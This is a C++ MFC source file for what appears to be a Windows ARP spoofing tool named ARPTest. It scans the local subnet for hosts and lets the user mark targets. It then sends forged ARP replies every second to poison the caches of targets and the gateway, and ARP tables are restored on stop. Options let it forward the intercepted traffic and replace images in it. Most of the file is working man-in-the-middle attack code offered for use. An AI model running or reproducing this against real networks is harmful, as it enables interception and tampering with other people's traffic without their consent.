#include "stdafx.h"
#include "ARPTest.h"
#include "ARPTestDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CARPTestDlg::CARPTestDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CARPTestDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

#pragma region MFC
void CARPTestDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_deviceDescList);
	DDX_Control(pDX, IDC_BUTTON1, m_attackButton);
	DDX_Control(pDX, IDC_EDIT4, m_selfIpEdit);
	DDX_Control(pDX, IDC_EDIT5, m_selfMacEdit);
	DDX_Control(pDX, IDC_EDIT8, m_selfGatewayEdit);
	DDX_Control(pDX, IDC_LIST2, m_hostList);
	DDX_Control(pDX, IDC_BUTTON2, m_confirmButton);
	DDX_Control(pDX, IDC_CHECK1, m_forwardCheck);
	DDX_Control(pDX, IDC_CHECK2, m_replaceImagesCheck);
	DDX_Control(pDX, IDC_EDIT1, m_imagePathEdit);
	DDX_Control(pDX, IDC_STATIC1, m_statusStatic);
	DDX_Control(pDX, IDC_CHECK3, m_cheatTargetCheck);
	DDX_Control(pDX, IDC_CHECK4, m_cheatGatewayCheck);
}

BEGIN_MESSAGE_MAP(CARPTestDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CARPTestDlg::OnBnClickedButton1)
	ON_WM_DESTROY()
	ON_LBN_SELCHANGE(IDC_LIST1, &CARPTestDlg::OnLbnSelchangeList1)
	ON_BN_CLICKED(IDC_BUTTON2, &CARPTestDlg::OnBnClickedButton2)
	ON_NOTIFY(LVN_ITEMCHANGED, IDC_LIST2, &CARPTestDlg::OnLvnItemchangedList2)
	ON_BN_CLICKED(IDC_CHECK3, &CARPTestDlg::OnBnClickedCheck3)
	ON_BN_CLICKED(IDC_CHECK4, &CARPTestDlg::OnBnClickedCheck4)
	ON_BN_CLICKED(IDC_CHECK1, &CARPTestDlg::OnBnClickedCheck1)
	ON_BN_CLICKED(IDC_CHECK2, &CARPTestDlg::OnBnClickedCheck2)
	ON_EN_KILLFOCUS(IDC_EDIT1, &CARPTestDlg::OnEnKillfocusEdit1)
	ON_WM_TIMER()
END_MESSAGE_MAP()

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CARPTestDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CARPTestDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
#pragma endregion


// CARPTestDlg 消息处理程序

// initialize
BOOL CARPTestDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	ShowWindow(SW_MINIMIZE);

	m_hostList.SetExtendedStyle(m_hostList.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES);
	int i = 0;
	m_hostList.InsertColumn(i++, "attack", LVCFMT_LEFT, 60);
	m_hostList.InsertColumn(i++, "IP", LVCFMT_LEFT, 110);
	m_hostList.InsertColumn(i++, "MAC", LVCFMT_LEFT, 150);
	m_hostList.InsertColumn(i++, "cheat", LVCFMT_LEFT, 60);
	m_hostList.InsertColumn(i++, "forward", LVCFMT_LEFT, 65);
	m_hostList.InsertColumn(i++, "replace images", LVCFMT_LEFT, 150);

	// get device list
	char errBuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&g_deviceList, errBuf) == -1)
	{
		CString msg = "Error in pcap_findalldevs: ";
		msg += errBuf;
		MessageBox(msg, NULL, MB_ICONERROR);
		DestroyWindow();
		return TRUE;
	}
	// show device list
	for (pcap_if_t* device = g_deviceList; device != NULL; device = device->next)
		m_deviceDescList.AddString(device->description != NULL ? device->description : "");
	if (m_deviceDescList.GetCount() <= 0)
	{
		MessageBox("No interface found! Make sure WinPcap is installed.", NULL, MB_ICONERROR);
		DestroyWindow();
		return TRUE;
	}
	m_deviceDescList.SetCurSel(0);
	OnLbnSelchangeList1();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// release
void CARPTestDlg::OnDestroy()
{
	CDialog::OnDestroy();

	g_attacking = FALSE;
	g_programRunning = FALSE;
	Sleep(3000); // wait for threads to end
	pcap_freealldevs(g_deviceList);
}

/////////////////////////////////////////////////////////////////////////////////////////

// get adapter infomation and fill global variables
void CARPTestDlg::OnLbnSelchangeList1()
{
	// get adapter
	int index = m_deviceDescList.GetCurSel();
	g_adapter = g_deviceList;
	for (int i = 0; i < index; i++)
		g_adapter = g_adapter->next;

	// get adapter infomation
	CString ip, gateway;
	MacAddress mac;

	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufSize = sizeof(adapterInfo);
	DWORD status = GetAdaptersInfo(adapterInfo, &bufSize);
	if (status != ERROR_SUCCESS)
	{
		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
		return;
	}
	CString name = g_adapter->name;
	for (PIP_ADAPTER_INFO pInfo = adapterInfo; pInfo != NULL; pInfo = pInfo->Next)
		if (name.Find(pInfo->AdapterName) != -1)
		{
			ip = pInfo->IpAddressList.IpAddress.String;
			mac = *(MacAddress*)pInfo->Address;
			gateway = pInfo->GatewayList.IpAddress.String;
			break;
		}
	if (ip == "")
	{
		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
		return;
	}

	// fill global variables
	m_selfIpEdit.SetWindowText(ip);
	DWORD iIp;
	inputIp(ip, iIp);
	g_selfIp = iIp;
	m_selfMacEdit.SetWindowText((CString)mac);
	g_selfMac = mac;
	m_selfGatewayEdit.SetWindowText(gateway);
	inputIp(gateway, g_selfGateway);
}

// confirm device and scan hosts
void CARPTestDlg::OnBnClickedButton2()
{
	m_deviceDescList.EnableWindow(FALSE);
	m_confirmButton.EnableWindow(FALSE);
	SetTimer(0, 3000, NULL);
	AfxBeginThread([](LPVOID _thiz)->UINT{
		CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
		pcap_t* adapter = NULL;
		if (!GetAdapterHandle(adapter))
			return 0;

		ARPPacket packet(TRUE);
		memset(packet.destinationMac.byteArray, 0xFF, sizeof(packet.destinationMac.byteArray)); // broadcast
		packet.SetSender(g_selfIp, g_selfMac);

		// get IP range
		DWORD rSelfIp = ntohl(g_selfIp);
		DWORD startIp = rSelfIp & 0xFFFFFF00 | 0x01;
		DWORD stopIp = rSelfIp & 0xFFFFFF00 | 0xFE;

		// scan
		packet.targetIp = g_selfGateway;
		pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
		Sleep(10);
		for (DWORD ip = startIp; ip <= stopIp; ip++)
		{
			DWORD rIp = htonl(ip);
			if (rIp != g_selfIp && rIp != g_selfGateway)
			{
				packet.targetIp = rIp;
				pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
				Sleep(10);
			}
		}

		// get reply
		SetFilter(adapter, "ether proto arp");
		pcap_pkthdr* header;
		const BYTE* pkt_data;
		int res;
		while (g_programRunning && (res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0)
		{
			if (res == 0) // timeout
				continue;
			const ARPPacket* pak = (const ARPPacket*)pkt_data;
			if (pak->type != PROTOCOL_ARP || pak->opcode != ARP_OPCODE_REPLY && pak->opcode != ARP_OPCODE_REQUEST) // not ARP
				continue;
			g_hostAttackListLock.Lock();
			if (g_host.find(pak->senderIp) != g_host.end()) // not in g_host
			{
				g_hostAttackListLock.Unlock();
				continue;
			}
			g_hostAttackListLock.Unlock();

			// add to list
			if (pak->senderIp != g_selfIp && pak->senderIp != g_selfGateway)
			{
				int index = thiz->m_hostList.GetItemCount();
				thiz->m_hostList.InsertItem(index, "");
				BYTE* bIp = (BYTE*)&pak->senderIp;
				CString tmp;
				tmp.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
				thiz->m_hostList.SetItemText(index, 1, tmp);
				thiz->m_hostList.SetItemText(index, 2, (CString)pak->senderMac);
				thiz->m_hostList.SetItemText(index, 3, "↑↓");
				thiz->m_hostList.SetItemText(index, 4, "true");
				thiz->m_hostList.SetItemData(index, (DWORD_PTR)pak->senderIp);
			}
			// add to g_host
			g_hostAttackListLock.Lock();
			HostInfoSetting& host = g_host[pak->senderIp];
			host.ip = pak->senderIp;
			host.mac = pak->senderMac;
			g_hostAttackListLock.Unlock();

			if (pak->senderIp == g_selfGateway)
				g_gatewayMac = pak->senderMac;
		}

		pcap_close(adapter);
		return 0;
	}, this);
}

#pragma region UI
/////////////////////////////////////////////////////////////////////////////////////////
//
//                                         UI
//

// add / delete attack list / display host information
void CARPTestDlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	*pResult = 0;

	if (pNMLV->uChanged == LVIF_STATE)
	{
		if ((pNMLV->uNewState & LVIS_SELECTED) != 0)
		{
			DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
			g_hostAttackListLock.Lock();
			HostInfoSetting& host = g_host[ip];
			g_hostAttackListLock.Unlock();

			m_cheatTargetCheck.SetCheck(host.cheatTarget);
			m_cheatGatewayCheck.SetCheck(host.cheatGateway);
			m_forwardCheck.SetCheck(host.forward);
			m_replaceImagesCheck.SetCheck(host.replaceImages);
			m_imagePathEdit.SetWindowText(host.imagePath);
			return;
		}
	}

	if (pNMLV->uOldState == 0 && pNMLV->uNewState == 0) // No change
		return;

	// Old check box state
	int prevState = ((pNMLV->uOldState & LVIS_STATEIMAGEMASK) >> 12) - 1;
	if (prevState < 0) // On startup there's no previous state 
		prevState = 0; // so assign as false (unchecked)

	// New check box state
	int checked = ((pNMLV->uNewState &LVIS_STATEIMAGEMASK) >> 12) - 1;
	if (checked < 0) // On non-checkbox notifications assume false
		checked = 0;

	if (prevState == checked) // No change in check box
		return;
	// Now checked holds the new check box state

	DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
	g_hostAttackListLock.Lock();
	if (checked != 0)
	{
		HostInfoSetting& host = g_host[ip];
		g_attackList[ip] = &host;
		g_attackListMac[host.mac] = &host;
	}
	else
	{
		g_attackList.erase(ip);
		g_attackListMac.erase(g_host[ip].mac);
	}
	g_hostAttackListLock.Unlock();
}

HostInfoSetting* CARPTestDlg::GetCurSelHost(int& index)
{
	POSITION pos = m_hostList.GetFirstSelectedItemPosition();
	if (pos == NULL)
		return NULL;
	index = m_hostList.GetNextSelectedItem(pos);
	DWORD ip = (DWORD)m_hostList.GetItemData(index);
	g_hostAttackListLock.Lock();
	HostInfoSetting* res = &g_host[ip];
	g_hostAttackListLock.Unlock();
	return res;
}

// cheat target
void CARPTestDlg::OnBnClickedCheck3()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == NULL)
		return;
	host->cheatTarget = m_cheatTargetCheck.GetCheck();
	CString tmp;
	if (host->cheatTarget)
		tmp += "↑";
	if (host->cheatGateway)
		tmp += "↓";
	m_hostList.SetItemText(index, 3, tmp);
}

// cheat gateway
void CARPTestDlg::OnBnClickedCheck4()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == NULL)
		return;
	host->cheatGateway = m_cheatGatewayCheck.GetCheck();
	CString tmp;
	if (host->cheatTarget)
		tmp += "↑";
	if (host->cheatGateway)
		tmp += "↓";
	m_hostList.SetItemText(index, 3, tmp);
}

// forward
void CARPTestDlg::OnBnClickedCheck1()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == NULL)
		return;
	host->forward = m_forwardCheck.GetCheck();
	m_hostList.SetItemText(index, 4, host->forward ? "true" : "false");
}

// replace images
void CARPTestDlg::OnBnClickedCheck2()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == NULL)
		return;
	host->replaceImages = m_replaceImagesCheck.GetCheck();
	m_hostList.SetItemText(index, 5, host->replaceImages ? host->imagePath : "");
}

// image path
void CARPTestDlg::OnEnKillfocusEdit1()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == NULL)
		return;
	m_imagePathEdit.GetWindowText(host->imagePath);
	m_hostList.SetItemText(index, 5, host->replaceImages ? host->imagePath : "");

	// read image
	CFile f;
	host->imageDataLock.Lock();
	if (f.Open(host->imagePath, CFile::modeRead | CFile::typeBinary))
	{
		host->imageDataLen = (DWORD)f.GetLength();
		if (host->imageData != NULL)
			delete host->imageData;
		host->imageData = new BYTE[host->imageDataLen];
		f.Read(host->imageData, host->imageDataLen);
	}
	else
	{
		host->imageDataLen = 0;
		if (host->imageData != NULL)
			delete host->imageData;
		host->imageData = NULL;
		MessageBox("Failed to load the image.");
	}
	host->imageDataLock.Unlock();
}

// update status
void CARPTestDlg::OnTimer(UINT_PTR nIDEvent)
{
	if (nIDEvent == 0) // update status
	{
		int index;
		HostInfoSetting* host = GetCurSelHost(index);
		if (host == NULL)
			return;
		CString status;
		status.Format("send %u, receive %u", host->send, host->receive);
		m_statusStatic.SetWindowText(status);
	}

	CDialog::OnTimer(nIDEvent);
}

/////////////////////////////////////////////////////////////////////////////////////////
#pragma endregion

// start / stop and send ARP packet
void CARPTestDlg::OnBnClickedButton1()
{
	if (g_attacking)
	{
		g_attacking = FALSE;
		m_attackButton.EnableWindow(FALSE);
		return;
	}
	g_attacking = TRUE;
	m_attackButton.EnableWindow(FALSE);

	AfxBeginThread([](LPVOID _thiz)->UINT{
		CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
		pcap_t* adapter;
		if (!GetAdapterHandle(adapter))
			return 0;

		thiz->m_attackButton.SetWindowText("stop");
		thiz->m_attackButton.EnableWindow(TRUE);
		AfxBeginThread(PacketHandleThread, thiz); // start capture

		ARPPacket packet(FALSE);
		packet.SetSender(0, g_selfMac);
		// send
		while (g_attacking)
		{
			DWORD time = GetTickCount();
			g_hostAttackListLock.Lock();
			for (const auto i : g_attackList)
			{
				if (i.second->cheatTarget) // send to target
				{
					packet.SetTarget(i.first, i.second->mac);
					packet.senderIp = g_selfGateway;
					pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
				}
				if (i.second->cheatGateway) // send to gateway
				{
					packet.SetTarget(g_selfGateway, g_gatewayMac);
					packet.senderIp = i.first;
					pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
				}
			}
			g_hostAttackListLock.Unlock();
			Sleep(1000 - (GetTickCount() - time));
		}

		// recover
		g_hostAttackListLock.Lock();
		for (const auto i : g_attackList)
		{
			// send to target
			packet.SetSender(g_selfGateway, g_gatewayMac);
			packet.SetTarget(i.first, i.second->mac);
			pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
			// send to gateway
			packet.SetSender(i.first, i.second->mac);
			packet.SetTarget(g_selfGateway, g_gatewayMac);
			pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
		}
		g_hostAttackListLock.Unlock();

		// end
		pcap_close(adapter);
		thiz->m_attackButton.SetWindowText("start");
		thiz->m_attackButton.EnableWindow(TRUE);
		return 0;
	}, this);
}
